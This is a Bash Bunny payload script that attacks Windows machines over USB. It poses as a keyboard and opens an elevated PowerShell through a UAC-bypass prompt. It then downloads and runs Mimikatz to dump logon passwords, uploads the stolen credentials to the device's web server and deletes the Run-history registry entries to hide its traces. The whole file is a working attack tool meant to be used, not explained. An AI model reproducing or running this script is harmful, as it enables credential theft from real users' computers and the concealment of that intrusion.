#!/bin/bash
#
# Title:         MrsRobot Mimikatz Attack
# Author:        hacXsbix, based on MrRobot from illwill, El3ct71k
# Target:        Windows 32bit and 64bit
# Attackmodes:   HID, RNDIS_ETHERNET
#
# Dumps the usernames & plaintext passwords from Windows boxes using Powershell in memory
# with Mimikatz then stashes them in /root/udisk/loot/MrRobot
# works with 32 and 64bit Windows, but mimikatz cannot always find password
#
# Purple (SETUP)......................Setup
# Yellow single blink (STAGE1).........Running Powershell HID attack
# Cyan inverted single blink (SPECIAL1)..Waiting for target machine to send mimikatz results
# SUCCESS G..............Got Creds and copied to loot folder, password found
# SUCCESS B..............Got Creds and copied to loot folder, password not found
# Red (Fail1)................Error running mimikatz or getting results


LED SETUP
# Creating Loot Folders
LOOTDIR=/root/udisk/loot/MrRobot_a
mkdir -p $LOOTDIR
SWITCHDIR=/root/udisk/payloads/$SWITCH_POSITION
mkdir -p $SWITCHDIR/loot


# HID Attack Starts
LED STAGE1
ATTACKMODE HID RNDIS_ETHERNET

# start server to receive mimikatz results
iptables -A OUTPUT -p udp --dport 53 -j DROP
python $SWITCHDIR/server.py &

# set keyboard layout to us-EN for computers around the world
# this can take longer time for slower computers so adjust delay times where indicated (on one laptop it took ~3s to change language with powershell)
SETKB START
Q DELAY 3000 # increase for slower computers
DUCKY_LANG us
# UAC Bypass
RUN WIN "powershell -c \"Start-Process powershell -verb runas\""
Q DELAY 2000
Q LEFT
Q DELAY 250
Q ENTER
Q DELAY 3000 # increase for slower computers

LED STAGE2
#Powershell Payload: first wait for connection to bunny webserver, then download mimikatz, run it and upload results
Q STRING "while (\$true) {If (Test-Connection 172.16.64.1 -count 1) { echo \"connected\"; \$e=\"\"; if ([System.IntPtr]::Size -eq 4) { \$e=\"32bit\" } else { \$e=\"64bit\" }; \$a = (New-Object Net.WebClient).DownloadString('http://172.16.64.1/hexdump_'+\$e+'.txt'); echo \"download complete\"; [Byte[]] \$b = \$a -split ' ';[System.IO.File]::WriteAllBytes(\"\$env:temp\c.exe\", \$b);echo \"file written\"; \$d = IEX \"\$env:temp\c.exe privilege::debug sekurlsa::logonpasswords exit\"; Remove-Item \$env:temp\c.exe; echo \"mimikatzed\"; (New-Object Net.WebClient).UploadString('http://172.16.64.1/'+\$env:computername, \$d);(New-Object Net.WebClient).UploadString('http://172.16.64.1/EOF', 'EOF'); echo \"uploaded\"; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; sleep 5; exit}} "

Q DELAY 300
Q ENTER
Q DELAY 500
SETKB DONE

#Wait for EOF in loot folder -> attack finished
LED SPECIAL1
while [ ! -e  "$SWITCHDIR/loot/EOF" ]; do sleep 1; done;
sleep 1


LED CLEANUP
if [ "$(ls -A $SWITCHDIR/loot/)" ]; then
	# check if found a password
	found=0
	while read -r line; do
		all=$(cat $SWITCHDIR/loot/$line | grep -o 'Password : ' | wc -l)
		nn=$(cat $SWITCHDIR/loot/$line | grep -o 'Password : (null)' | wc -l)
		# compare all 'Password :' entries with ones which have no password '(null)'
		if [ "$all" -gt "$nn" ]; then
			found=1
			break
		fi
	done < <(ls $SWITCHDIR/loot/ | grep txt)
	
	# move files to loot folder
	mv -v $SWITCHDIR/loot/*.txt $LOOTDIR
	rm -rf $SWITCHDIR/loot/
	if [ "$found" -eq 1 ]; then
		LED FINISH
	else
		LED B SUCCESS
	fi
else
	LED FAIL1
fi

sync
